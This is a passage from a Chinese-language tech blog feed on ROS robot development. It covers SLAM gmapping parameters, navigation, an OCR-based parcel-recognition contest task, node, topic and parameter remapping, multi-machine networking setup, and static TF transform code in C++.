        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"srt"</span> <span class="na">value=</span><span class="s">"0.2"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"str"</span> <span class="na">value=</span><span class="s">"0.1"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"stt"</span> <span class="na">value=</span><span class="s">"0.2"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"linearUpdate"</span> <span class="na">value=</span><span class="s">"1.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"angularUpdate"</span> <span class="na">value=</span><span class="s">"0.5"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"temporalUpdate"</span> <span class="na">value=</span><span class="s">"3.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"resampleThreshold"</span> <span class="na">value=</span><span class="s">"0.5"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"particles"</span> <span class="na">value=</span><span class="s">"30"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"xmin"</span> <span class="na">value=</span><span class="s">"-50.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"ymin"</span> <span class="na">value=</span><span class="s">"-50.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"xmax"</span> <span class="na">value=</span><span class="s">"50.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"ymax"</span> <span class="na">value=</span><span class="s">"50.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"delta"</span> <span class="na">value=</span><span class="s">"0.05"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"llsamplerange"</span> <span class="na">value=</span><span class="s">"0.01"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"llsamplestep"</span> <span class="na">value=</span><span class="s">"0.01"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"lasamplerange"</span> <span class="na">value=</span><span class="s">"0.005"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"lasamplestep"</span> <span class="na">value=</span><span class="s">"0.005"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/node&gt;</span>
<span class="nt">&lt;/launch&gt;</span>
</code></pre></div></div> <h3 id="导航实现">导航实现</h3> <p>导航系统需要完成以下任务：</p> <ol> <li>路径规划 - 根据目标点规划路径</li> <li>定位 - 确定机器人在地图中的位置</li> <li>路径跟踪 - 控制机器人沿着规划路径移动</li> </ol> <p><strong>使用 rviz 工具来演示机器人的建图和导航过程：</strong></p> <ol> <li>启动建图节点</li> <li>使用键盘控制机器人移动，完成建图</li> <li>保存地图</li> <li>启动导航节点，设置目标点进行导航</li> </ol> <hr/> <h2 id="三图像识别应用">三、图像识别应用</h2> <h3 id="图像识别任务">图像识别任务</h3> <p>在 ROS 机器人开发中，图像识别是一个重要的应用场景。例如，在深大 ROS 俱乐部内部赛中，需要实现邮件省份识别和二维码识别。</p> <h4 id="任务要求">任务要求</h4> <ol> <li> <p><strong>远程测试图像为随机的 20 张图片，并在规定时间（3 分钟）内反馈识别结果</strong></p> </li> <li> <p><strong>识别结果格式：</strong></p> <ul> <li>输出邮件省份文字，显示到结果图像中</li> <li>在结果图像中标出邮件盒在图像中的位置（可框起来），并得到邮件盒中心在图像中大致的像素坐标</li> <li>结果需以文本保存文件中，格式：<code class="language-plaintext highlighter-rouge">广东,(232,311); 江苏,(299,283);...</code></li> </ul> </li> <li> <p><strong>技术实现：</strong></p> <ul> <li>使用 PaddleOCR 模块进行文字识别</li> <li>使用 OpenCV 进行图像处理</li> <li>通过多种方法进行图像处理，最终可以快速在图片中找到快递盒位置并标注省份和中心点坐标信息</li> </ul> </li> </ol> <h3 id="实现方案">实现方案</h3> <p><strong>集成化处理，一句运行程序语句即可实现功能，程序在 windows 下运行。</strong></p> <p>主要技术栈：</p> <ul> <li>Python</li> <li>PaddleOCR</li> <li>OpenCV</li> <li>ROS 图像消息处理</li> </ul> <hr/> <h2 id="四深大-ros-俱乐部内部赛">四、深大 ROS 俱乐部内部赛</h2> <p>深大 ROS 俱乐部内部赛是一个综合性的 ROS 机器人竞赛，包含三个主要部分：</p> <h3 id="第一部分ros-基础20-分">第一部分：ROS 基础（20 分）</h3> <p>完成 ROS 基础概念的编程实验，要求使用 C++ 或 python。</p> <p><strong>实验 1：</strong> 使用 ROS 话题(Topic)机制实现消息发布与订阅</p> <ul> <li>创建一个发布者，每隔 100ms 依次发送斐波拉契数列的数字到话题 /fibonacci 中</li> <li>创建一个订阅者，订阅该话题，输出订阅结果</li> </ul> <p><strong>实验 2：</strong> 使用 ROS 服务(Service)机制实现同步请求与答复</p> <ul> <li>创建服务端，注册 Service，当服务端收到客户端 Service 请求（携带整型参数 a,b）后，服务端返回 a,b 的和给客户端</li> </ul> <p><strong>实验 3：</strong> 使用 ROS 动作(Action)机制实现目标请求、进度与完成结果的反馈</p> <ul> <li>创建服务端，注册 Action，客户端发送 action 请求检测 40 个零件，服务端接收后，每隔 1s 检测一个零件，并实时给客户端返回检测进度</li> </ul> <h3 id="第二部分机器人建图导航任务40-分">第二部分：机器人建图导航任务（40 分）</h3> <p>使用竞赛机器人（turtlebot3），在 gazebo 仿真环境中，完成基于 ROS 的机器人 SLAM 建图导航。</p> <p><strong>任务 1：</strong> 选手操作机器人，在场景中构建出环境地图，并提供地图参数文件</p> <p><strong>任务 2：</strong> 选手提前记录/计算好点位坐标，程序运行后，机器人从出发区出发，往返分拣台中间位置与投递箱进行邮件的抓取投放</p> <h3 id="第三部分图像识别40-分">第三部分：图像识别（40 分）</h3> <p>图像内容为张贴在盒子上的标签。输出皆为各省区 2~3 字的简写名称。</p> <p><strong>要求：</strong></p> <ul> <li>远程测试图像为随机的 20 张图片，并在规定时间（3 分钟）内反馈识别结果</li> <li>输出邮件省份文字，显示到结果图像中</li> <li>在结果图像中标出邮件盒在图像中的位置，并得到邮件盒中心在图像中大致的像素坐标</li> </ul> <hr/> <h2 id="总结">总结</h2> <p>ROS 机器人开发实践涉及多个方面：</p> <ol> <li><strong>URDF 建模</strong> - 描述机器人物理结构</li> <li><strong>SLAM 建图导航</strong> - 实现机器人的自主定位和导航</li> <li><strong>图像识别</strong> - 使用计算机视觉技术进行目标识别</li> <li><strong>系统集成</strong> - 将各个模块整合成完整的机器人系统</li> </ol> <p>这些实践项目不仅加深了对 ROS 系统的理解，也提升了机器人开发的综合能力。</p>]]></content><author><name></name></author><category term="ROS"/><category term="ROS"/><category term="机器人"/><category term="URDF"/><category term="SLAM"/><category term="导航"/><category term="图像识别"/><summary type="html"><![CDATA[ROS 机器人开发实践，包括 URDF 建模、SLAM 建图导航、图像识别等实际应用]]></summary></entry><entry><title type="html">ROS 运行管理与常用组件</title><link href="https://gewenhao.win/blog/2023/ROS%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6/" rel="alternate" type="text/html" title="ROS 运行管理与常用组件"/><published>2023-09-15T10:00:00+00:00</published><updated>2023-09-15T10:00:00+00:00</updated><id>https://gewenhao.win/blog/2023/ROS%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6</id><content type="html" xml:base="https://gewenhao.win/blog/2023/ROS%E8%BF%90%E8%A1%8C%E7%AE%A1%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6/"><![CDATA[<h1 id="ros-运行管理与常用组件">ROS 运行管理与常用组件</h1> <h2 id="一ros-运行管理">一、ROS 运行管理</h2> <h3 id="节点名称重名">节点名称重名</h3> <h4 id="1-rosrun-设置命名空间">1. rosrun 设置命名空间</h4> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosrun turtlesim turtlesim_node __ns:<span class="o">=</span>/xxx
rosrun turtlesim turtlesim_node __ns:<span class="o">=</span>/yyy
</code></pre></div></div> <p>结果：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/xxx/turtlesim
/yyy/turtlesim
</code></pre></div></div> <h4 id="2-rosrun-名称重映射">2. rosrun 名称重映射</h4> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosrun turtlesim turtlesim_node __name:<span class="o">=</span>t1
rosrun turtlesim turtlesim_node __name:<span class="o">=</span>t2
</code></pre></div></div> <p>结果：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/t1
/t2
</code></pre></div></div> <h4 id="3-rosrun-名称重映射与设置命名空间叠加">3. rosrun 名称重映射与设置命名空间叠加</h4> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosrun turtlesim turtlesim_node __ns:<span class="o">=</span>/xxx __name:<span class="o">=</span>tn
</code></pre></div></div> <h4 id="4-launch-文件设置命名空间与重映射">4. launch 文件设置命名空间与重映射</h4> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;launch&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"turtlesim"</span> <span class="na">type=</span><span class="s">"turtlesim_node"</span> <span class="na">name=</span><span class="s">"t1"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"turtlesim"</span> <span class="na">type=</span><span class="s">"turtlesim_node"</span> <span class="na">name=</span><span class="s">"t2"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"turtlesim"</span> <span class="na">type=</span><span class="s">"turtlesim_node"</span> <span class="na">name=</span><span class="s">"t1"</span> <span class="na">ns=</span><span class="s">"hello"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/launch&gt;</span>
</code></pre></div></div> <p>结果：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/t1
/t2
/hello/t1
</code></pre></div></div> <h4 id="5-编码设置命名空间与重映射">5. 编码设置命名空间与重映射</h4> <p><strong>C++：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//名称别名</span>
<span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"zhangsan"</span><span class="p">,</span><span class="n">ros</span><span class="o">::</span><span class="n">init_options</span><span class="o">::</span><span class="n">AnonymousName</span><span class="p">);</span>
<span class="c1">//命名空间</span>
<span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">map</span><span class="p">;</span>
<span class="n">map</span><span class="p">[</span><span class="s">"__ns"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"xxxx"</span><span class="p">;</span>
<span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="s">"wangqiang"</span><span class="p">);</span>
</code></pre></div></div> <p><strong>Python：</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rospy</span><span class="p">.</span><span class="nf">init_node</span><span class="p">(</span><span class="sh">"</span><span class="s">lisi</span><span class="sh">"</span><span class="p">,</span><span class="n">anonymous</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div> <h3 id="话题名称重名">话题名称重名</h3> <h4 id="1-rosrun-设置话题重映射">1. rosrun 设置话题重映射</h4> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosrun teleop_twist_keyboard teleop_twist_keyboard.py /cmd_vel:<span class="o">=</span>/turtle1/cmd_vel
rosrun turtlesim turtlesim_node /turtle1/cmd_vel:<span class="o">=</span>/cmd_vel
</code></pre></div></div> <h4 id="2-launch-文件设置话题重映射">2. launch 文件设置话题重映射</h4> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"xxx"</span> <span class="na">type=</span><span class="s">"xxx"</span> <span class="na">name=</span><span class="s">"xxx"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;remap</span> <span class="na">from=</span><span class="s">"原话题"</span> <span class="na">to=</span><span class="s">"新话题"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/node&gt;</span>
</code></pre></div></div> <p>示例：</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;launch&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"turtlesim"</span> <span class="na">type=</span><span class="s">"turtlesim_node"</span> <span class="na">name=</span><span class="s">"t1"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"teleop_twist_keyboard"</span> <span class="na">type=</span><span class="s">"teleop_twist_keyboard.py"</span> <span class="na">name=</span><span class="s">"key"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;remap</span> <span class="na">from=</span><span class="s">"/cmd_vel"</span> <span class="na">to=</span><span class="s">"/turtle1/cmd_vel"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/node&gt;</span>
<span class="nt">&lt;/launch&gt;</span>
</code></pre></div></div> <h4 id="3-编码设置话题名称">3. 编码设置话题名称</h4> <p><strong>C++：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1）全局名称</span>
<span class="n">ros</span><span class="o">::</span><span class="n">Publisher</span> <span class="n">pub</span> <span class="o">=</span> <span class="n">nh</span><span class="p">.</span><span class="n">advertise</span><span class="o">&lt;</span><span class="n">std_msgs</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s">"/chatter"</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
<span class="c1">// /chatter</span>

<span class="c1">// 2）相对名称</span>
<span class="n">ros</span><span class="o">::</span><span class="n">Publisher</span> <span class="n">pub</span> <span class="o">=</span> <span class="n">nh</span><span class="p">.</span><span class="n">advertise</span><span class="o">&lt;</span><span class="n">std_msgs</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s">"chatter"</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
<span class="c1">// xxx/chatter</span>

<span class="c1">// 3）私有名称</span>
<span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="nf">nh</span><span class="p">(</span><span class="s">"~"</span><span class="p">);</span>
<span class="n">ros</span><span class="o">::</span><span class="n">Publisher</span> <span class="n">pub</span> <span class="o">=</span> <span class="n">nh</span><span class="p">.</span><span class="n">advertise</span><span class="o">&lt;</span><span class="n">std_msgs</span><span class="o">::</span><span class="n">String</span><span class="o">&gt;</span><span class="p">(</span><span class="s">"chatter"</span><span class="p">,</span><span class="mi">1000</span><span class="p">);</span>
<span class="c1">// /xxx/hello/chatter</span>
</code></pre></div></div> <p><strong>Python：</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 1）全局名称
</span><span class="n">pub</span> <span class="o">=</span> <span class="n">rospy</span><span class="p">.</span><span class="nc">Publisher</span><span class="p">(</span><span class="sh">"</span><span class="s">/chatter</span><span class="sh">"</span><span class="p">,</span><span class="n">String</span><span class="p">,</span><span class="n">queue_size</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>
<span class="c1"># /chatter
</span>
<span class="c1"># 2）相对名称
</span><span class="n">pub</span> <span class="o">=</span> <span class="n">rospy</span><span class="p">.</span><span class="nc">Publisher</span><span class="p">(</span><span class="sh">"</span><span class="s">chatter</span><span class="sh">"</span><span class="p">,</span><span class="n">String</span><span class="p">,</span><span class="n">queue_size</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>
<span class="c1"># xxx/chatter
</span>
<span class="c1"># 3）私有名称
</span><span class="n">pub</span> <span class="o">=</span> <span class="n">rospy</span><span class="p">.</span><span class="nc">Publisher</span><span class="p">(</span><span class="sh">"</span><span class="s">~chatter</span><span class="sh">"</span><span class="p">,</span><span class="n">String</span><span class="p">,</span><span class="n">queue_size</span><span class="o">=</span><span class="mi">1000</span><span class="p">)</span>
<span class="c1"># /xxx/hello/chatter
</span></code></pre></div></div> <h3 id="参数名称设置">参数名称设置</h3> <h4 id="1-rosrun-设置参数">1. rosrun 设置参数</h4> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rosrun turtlesim turtlesim_node _A:<span class="o">=</span>100
</code></pre></div></div> <h4 id="2-launch-文件设置参数">2. launch 文件设置参数</h4> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;launch&gt;</span>
    <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"p1"</span> <span class="na">value=</span><span class="s">"100"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"turtlesim"</span> <span class="na">type=</span><span class="s">"turtlesim_node"</span> <span class="na">name=</span><span class="s">"t1"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"p2"</span> <span class="na">value=</span><span class="s">"100"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/node&gt;</span>
<span class="nt">&lt;/launch&gt;</span>
</code></pre></div></div> <p>结果：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/p1
/t1/p1
</code></pre></div></div> <h4 id="3-编码设置参数">3. 编码设置参数</h4> <p><strong>C++ ros::param：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ros</span><span class="o">::</span><span class="n">param</span><span class="o">::</span><span class="n">set</span><span class="p">(</span><span class="s">"/set_A"</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span> <span class="c1">//全局,和命名空间以及节点名称无关</span>
<span class="n">ros</span><span class="o">::</span><span class="n">param</span><span class="o">::</span><span class="n">set</span><span class="p">(</span><span class="s">"set_B"</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span> <span class="c1">//相对,参考命名空间</span>
<span class="n">ros</span><span class="o">::</span><span class="n">param</span><span class="o">::</span><span class="n">set</span><span class="p">(</span><span class="s">"~set_C"</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span> <span class="c1">//私有,参考命名空间与节点名称</span>

<span class="c1">// /set_A</span>
<span class="c1">// /xxx/set_B</span>
<span class="c1">// /xxx/yyy/set_C</span>
</code></pre></div></div> <p><strong>C++ ros::NodeHandle：</strong></p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>
<span class="n">nh</span><span class="p">.</span><span class="n">setParam</span><span class="p">(</span><span class="s">"/nh_A"</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span> <span class="c1">//全局,和命名空间以及节点名称无关</span>
<span class="n">nh</span><span class="p">.</span><span class="n">setParam</span><span class="p">(</span><span class="s">"nh_B"</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span> <span class="c1">//相对,参考命名空间</span>
<span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="nf">nh_private</span><span class="p">(</span><span class="s">"~"</span><span class="p">);</span>
<span class="n">nh_private</span><span class="p">.</span><span class="n">setParam</span><span class="p">(</span><span class="s">"nh_C"</span><span class="p">,</span><span class="mi">100</span><span class="p">);</span><span class="c1">//私有,参考命名空间与节点名称</span>

<span class="c1">// /nh_A</span>
<span class="c1">// /xxx/nh_B</span>
<span class="c1">// /xxx/yyy/nh_C</span>
</code></pre></div></div> <p><strong>Python：</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rospy</span><span class="p">.</span><span class="nf">set_param</span><span class="p">(</span><span class="sh">"</span><span class="s">/py_A</span><span class="sh">"</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>  <span class="c1">#全局,和命名空间以及节点名称无关
</span><span class="n">rospy</span><span class="p">.</span><span class="nf">set_param</span><span class="p">(</span><span class="sh">"</span><span class="s">py_B</span><span class="sh">"</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>  <span class="c1">#相对,参考命名空间
</span><span class="n">rospy</span><span class="p">.</span><span class="nf">set_param</span><span class="p">(</span><span class="sh">"</span><span class="s">~py_C</span><span class="sh">"</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>  <span class="c1">#私有,参考命名空间与节点名称
</span>
<span class="c1"># /py_A
# /xxx/py_B
# /xxx/yyy/py_C
</span></code></pre></div></div> <h3 id="分布式通信">分布式通信</h3> <h4 id="1-准备">1. 准备</h4> <p>先要保证不同计算机处于同一网络中，最好分别设置固定 IP，如果为虚拟机，需要将网络适配器改为桥接模式。</p> <h4 id="2-配置文件修改">2. 配置文件修改</h4> <p>分别修改不同计算机的 <code class="language-plaintext highlighter-rouge">/etc/hosts</code> 文件，在该文件中加入对方的 IP 地址和计算机名：</p> <p><strong>主机端：</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>从机的IP    从机计算机名
</code></pre></div></div> <p><strong>从机端：</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>主机的IP    主机计算机名
</code></pre></div></div> <p>设置完毕，可以通过 ping 命令测试网络通信是否正常。</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IP地址查看名: ifconfig
计算机名称查看: <span class="nb">hostname</span>
</code></pre></div></div> <h4 id="3-配置主机-ip">3. 配置主机 IP</h4> <p><code class="language-plaintext highlighter-rouge">~/.bashrc</code> 追加：</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">ROS_MASTER_URI</span><span class="o">=</span>http://主机IP:11311
<span class="nb">export </span><span class="nv">ROS_HOSTNAME</span><span class="o">=</span>主机IP
</code></pre></div></div> <h4 id="4-配置从机-ip">4. 配置从机 IP</h4> <p>配置从机的 IP 地址，从机可以有多台，每台都做如下设置：</p> <p><code class="language-plaintext highlighter-rouge">~/.bashrc</code> 追加：</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">ROS_MASTER_URI</span><span class="o">=</span>http://主机IP:11311
<span class="nb">export </span><span class="nv">ROS_HOSTNAME</span><span class="o">=</span>从机IP
</code></pre></div></div> <h4 id="测试">测试</h4> <ol> <li>主机启动 roscore(必须)</li> <li>主机启动订阅节点，从机启动发布节点，测试通信是否正常</li> <li>反向测试，主机启动发布节点，从机启动订阅节点，测试通信是否正常</li> </ol> <hr/> <h2 id="二tf-坐标变换">二、TF 坐标变换</h2> <h3 id="静态坐标变换">静态坐标变换</h3> <p>现有一机器人模型，核心构成包含主体与雷达，各对应一坐标系，坐标系的原点分别位于主体与雷达的物理中心，已知雷达原点相对于主体原点位移关系如下: x 0.2 y0.0 z0.5。当前雷达检测到一障碍物，在雷达坐标系中障碍物的坐标为 (2.0 3.0 5.0),请问，该障碍物相对于主体的坐标是多少？</p> <p><strong>实现流程:</strong> C++ 与 Python 实现流程一致</p> <ol> <li>新建功能包，添加依赖</li> <li>编写发布方实现</li> <li>编写订阅方实现</li> <li>执行并查看结果</li> </ol> <h3 id="c-实现">C++ 实现</h3> <h4 id="发布方">发布方</h4> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
#include</span> <span class="cpf">"tf2_ros/static_transform_broadcaster.h"</span><span class="cp">
#include</span> <span class="cpf">"geometry_msgs/TransformStamped.h"</span><span class="cp">
#include</span> <span class="cpf">"tf2/LinearMath/Quaternion.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"static_brocast"</span><span class="p">);</span>
    <span class="n">tf2_ros</span><span class="o">::</span><span class="n">StaticTransformBroadcaster</span> <span class="n">broadcaster</span><span class="p">;</span>
    <span class="n">geometry_msgs</span><span class="o">::</span><span class="n">TransformStamped</span> <span class="n">ts</span><span class="p">;</span>

    <span class="c1">//----设置头信息</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">stamp</span> <span class="o">=</span> <span class="n">ros</span><span class="o">::</span><span class="n">Time</span><span class="o">::</span><span class="n">now</span><span class="p">();</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">frame_id</span> <span class="o">=</span> <span class="s">"base_link"</span><span class="p">;</span>
    <span class="c1">//----设置子级坐标系</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">child_frame_id</span> <span class="o">=</span> <span class="s">"laser"</span><span class="p">;</span>
    <span class="c1">//----设置子级相对于父级的偏移量</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">transform</span><span class="p">.</span><span class="n">translation</span><span class="p">.</span><span class="n">x</span> <span class="o">=</span> <span class="mf">0.2</span><span class="p">;</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">transform</span><span class="p">.</span><span class="n">translation</span><span class="p">.</span><span class="n">y</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">transform</span><span class="p">.</span><span class="n">translation</span><span class="p">.</span><span class="n">z</span> <span class="o">=</span> <span class="mf">0.5</span><span class="p">;</span>
    <span class="c1">//----设置四元数:将 欧拉角数据转换成四元数</span>
    <span class="n">tf2</span><span class="o">::</span><span class="n">Quaternion</span> <span class="n">qtn</span><span class="p">;</span>
    <span class="n">qtn</span><span class="p">.</span><span class="n">setRPY</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">transform</span><span class="p">.</span><span class="n">rotation</span><span class="p">.</span><span class="n">x</span> <span class="o">=</span> <span class="n">qtn</span><span class="p">.</span><span class="n">getX</span><span class="p">();</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">transform</span><span class="p">.</span><span class="n">rotation</span><span class="p">.</span><span class="n">y</span> <span class="o">=</span> <span class="n">qtn</span><span class="p">.</span><span class="n">getY</span><span class="p">();</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">transform</span><span class="p">.</span><span class="n">rotation</span><span class="p">.</span><span class="n">z</span> <span class="o">=</span> <span class="n">qtn</span><span class="p">.</span><span class="n">getZ</span><span class="p">();</span>
    <span class="n">ts</span><span class="p">.</span><span class="n">transform</span><span class="p">.</span><span class="n">rotation</span><span class="p">.</span><span class="n">w</span> <span class="o">=</span> <span class="n">qtn</span><span class="p">.</span><span class="n">getW</span><span class="p">();</span>

    <span class="n">broadcaster</span><span class="p">.</span><span class="n">sendTransform</span><span class="p">(</span><span class="n">ts</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">spin</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h4 id="订阅方">订阅方</h4> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ros/ros.h"</span><span class="cp">
#include</span> <span class="cpf">"tf2_ros/transform_listener.h"</span><span class="cp">
#include</span> <span class="cpf">"tf2_ros/buffer.h"</span><span class="cp">
#include</span> <span class="cpf">"geometry_msgs/PointStamped.h"</span><span class="cp">
#include</span> <span class="cpf">"tf2_geometry_msgs/tf2_geometry_msgs.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span><span class="s">""</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="s">"tf_sub"</span><span class="p">);</span>
    <span class="n">ros</span><span class="o">::</span><span class="n">NodeHandle</span> <span class="n">nh</span><span class="p">;</span>
